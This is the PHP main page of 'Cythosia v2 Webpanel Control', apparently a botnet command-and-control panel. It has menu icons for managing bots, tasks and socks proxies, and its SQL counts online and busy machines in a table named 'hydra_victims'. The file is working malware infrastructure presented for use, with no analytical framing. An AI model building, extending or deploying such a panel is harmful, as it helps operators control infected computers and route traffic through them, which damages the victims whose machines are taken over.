<?php
	session_start();
	if(!isset($_SESSION['hydra_loggedin']))
	{
		header("Location: ../index.php");
	}
		include("inc/config.php");
		include("inc/funcs.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" version="-//W3C//DTD XHTML 1.1//EN" xml:lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<title>Cythosia v2 Webpanel Control</title>

		<script type="text/javascript" src="javascripts/prototype.js"> </script> 
		<script type="text/javascript" src="javascripts/effects.js"> </script> 
		<script type="text/javascript" src="javascripts/window.js"> </script> 
		<script type="text/javascript" src="javascripts/window_ext.js"> </script> 
		<script type="text/javascript" src="javascripts/debug.js"> </script> 
		<script type="text/javascript" src="desktop.js"> </script>
		<link href="white_style.css" rel="stylesheet" type="text/css">
		<link href="themes/default.css" rel="stylesheet" type="text/css"> 
		<link href="themes/zX.css" rel="stylesheet" type="text/css"> 
	</head>

	<body onload="showStat();start();">
		<div class="font">
			<div id="banner"></div>
			<div id="mainicons">
				<table width="300" border="0" cellpadding="0" cellspacing="15" id="icons">
					<tr>
						<td width="80" onClick="showBots();">
							<table class="icon" width="80" border="0" align="center" cellpadding="0" cellspacing="0">
								<tr>
									<td><div align="center"><img src="images/bots.png" alt="Bots" width="64" height="64" /></div></td>
								</tr>
								<tr>
									<td><div align="center">Bots</div></td>
								</tr>
							</table>
						</td>
						<td width="80" onClick="showTasks();">
							<table class="icon" width="80" border="0" align="center" cellpadding="0" cellspacing="0">
								<tr>
									<td><div align="center"><img src="images/tasks.png" alt="Befehle" width="64" height="64" /></div></td>
								</tr>
								<tr>
									<td><div align="center">Tasks</div></td>
								</tr>
							</table>
						</td>
						<td width="80" onClick="createTask();">
								<table class="icon" width="80" border="0" align="center" cellpadding="0" cellspacing="0">
								<tr>
									<td><div align="center"><img src="images/execute.png" alt="Befehle" width="64" height="64" /></div></td>
								</tr>
								<tr>
									<td><div align="center">Add Task</div></td>
								</tr>
							</table>
						</td>
						<td width="80" onClick="showSocks();">
							<table class="icon" width="80" border="0" align="center" cellpadding="0" cellspacing="0">
								<tr>
									<td><div align="center"><img src="images/server.png" alt="Socks" width="64" height="64" /></div></td>
								</tr>
								<tr>
									<td><div align="center">Socks</div></td>
								</tr>
							</table>
						</td>
					</tr>
				</table>
			</div>
			<div id="papericons"> 
				<table style="position: relative; bottom: 15px;" width="110" border="0" align="right" cellpadding="0" cellspacing="15" id="icons">
					<tr>
						<td width="80" onClick="showInfo();">
							<table class="icon" width="80" border="0" align="center" cellpadding="0" cellspacing="0">
								<tr>
									<td><div align="center"><img src="images/help.png" alt="Info" width="64" height="64" /></div></td>
								</tr>
								<tr>
									<td><div align="center">Help</div></td>
								</tr>
							</table>
						</td>
						<td width="80" onClick="showStat();">
							<table class="icon" width="80" border="0" align="center" cellpadding="0" cellspacing="0">
								<tr>
									<td><div align="center"><img src="images/stats.png" alt="stats" width="64" height="64" /></div></td>
								</tr>
								<tr>
									<td><div align="center">Statistics</div></td>
								</tr>
							</table>
						</td>
						<td width="80" onClick="logout();">
							<table class="icon" width="80" border="0" align="center" cellpadding="0" cellspacing="0">
								<tr>
									<td><div align="center"><img src="images/logout.png" alt="Logout" width="64" height="64" /></div></td>
								</tr>
								<tr>
									<td><div align="center">Logout</div></td>
								</tr>
							</table>
						</td>
					</tr>
				</table>
			</div>
			<div id="bottombar">
			<?php
				$query = mysql_query("
				SELECT 
				(SELECT count(*) FROM hydra_victims WHERE ConTime >".(time()-$time_on).") AS bots_online,
				(SELECT count(*) FROM hydra_victims WHERE ConTime >".(time()-$time_on)." AND taskID != 0) AS bots_busy,
				(SELECT count(*) FROM hydra_tasks AS t WHERE t.elapsed > '".time()."' OR (t.elapsed=0 AND (SELECT count(*) FROM hydra_task_done WHERE taskID=t.taskID)<bots)) AS tasks
				");
				$ds=mysql_fetch_array($query);
				$query3 = mysql_query("SELECT hwid FROM hydra_socks");
				$socks_online = 0;
				while($socks_hwid = mysql_fetch_array($query3))
				{
					$query4 = mysql_query("SELECT * FROM hydra_victims WHERE HWID = '".$socks_hwid['hwid']."' AND ConTime > '".(time()-$time_on)."'");
					$socks_online += mysql_num_rows($query4);
				}
				$table = '<p style="float: left;">Bots Online: <b>'.$ds['bots_online'].' Bots</b> | ';
				$table .= 'Busy Bots: <b>'.$ds['bots_busy'].' Bots</b> | ';
				$table .= 'Active Tasks: <b>'.$ds['tasks'].' Tasks</b>';
				echo $table;
			?>
			<div id="time"></div>
			</div>
		</div>
	</body>
</html>